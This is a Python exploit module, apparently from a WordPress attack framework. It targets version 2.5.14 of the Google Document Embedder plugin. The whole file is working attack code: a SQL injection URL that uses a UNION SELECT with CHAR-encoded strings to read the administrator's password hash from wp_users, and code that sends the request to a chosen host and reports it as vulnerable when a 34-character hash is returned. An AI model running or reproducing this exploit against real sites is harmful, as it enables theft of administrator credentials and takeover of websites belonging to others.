import http.client

from bs4 import BeautifulSoup
from exploits.exploitsql import ExploitSql


class GoogleDocEmbedder(ExploitSql):
	@staticmethod
	def getname():
		return "Google Document Embedder"

	@staticmethod
	def getversion():
		return '2.5.14'

	@staticmethod
	def getexploit():
		return "/wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=0%20UNION%20SELECT%201,%202,%203," \
				"%20CONCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%2058,%2054,%2058,%2034,%20118,%20119,%2095,%2099," \
				"%20115,%20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH(user_pass),%20CAST(CHAR(58,%2034)%20as%20CHAR)," \
				"%20user_pass,%20CAST(CHAR(34,%2059,%20125)%20as%20CHAR))%20FROM%20`wp_users`%20WHERE%20ID=1"

	@classmethod
	def exploit(cls, hostname):
		connection = http.client.HTTPConnection(hostname)
		connection.request("GET", cls.getexploit())
		response = connection.getresponse().read()
		soup = BeautifulSoup(response)
		for link in soup.findAll('link'):
			result = link.get('href')
			if len(result) == 34:
				print('\r\n')
				print(cls.getname() + " " + cls.getversion() + " is vulnerable with exploit: \r\n" + hostname + cls.getexploit())
